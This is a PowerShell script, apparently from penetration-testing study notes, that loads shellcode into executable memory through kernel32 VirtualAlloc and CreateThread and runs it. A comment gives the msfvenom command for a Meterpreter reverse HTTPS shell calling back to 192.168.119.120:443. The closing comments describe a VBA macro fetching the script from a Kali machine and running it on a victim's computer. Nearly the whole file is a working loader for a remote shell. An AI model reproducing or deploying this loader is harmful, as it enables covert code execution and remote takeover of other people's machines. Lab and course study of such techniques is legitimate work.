$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
	[DllImport("kernel32")]
	public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32", CharSet=CharSet.Ansi)]
	public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
	[DllImport("kernel32.dll", SetLastError=true)] public static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

# Create your shellcode with .ps1 and copy then paste on appropriate place 
# Command to create a shellcode : msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1

[Byte[]] $buf = PLACE YOUR SHELLCODE HERE 

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

# To stop our shell to terminate we make some changes from previous one 
# When CreateThread is called, it returns a handle to the newly created thread. We provided this handle to WaitForSingleObject along with the
# time to wait for that thread to finish. In this case, we have specified 0xFFFFFFFF, which will instruct the program to wait forever or until
# we exit our shell. Notice that we have explicitly performed a type cast on this value to an unsigned integer with the [unit32] static .NET
# type because PowerShell only uses signed integers
# This file is save on kali linux Our VBA script fetch from our machine and executes it in victim machine 

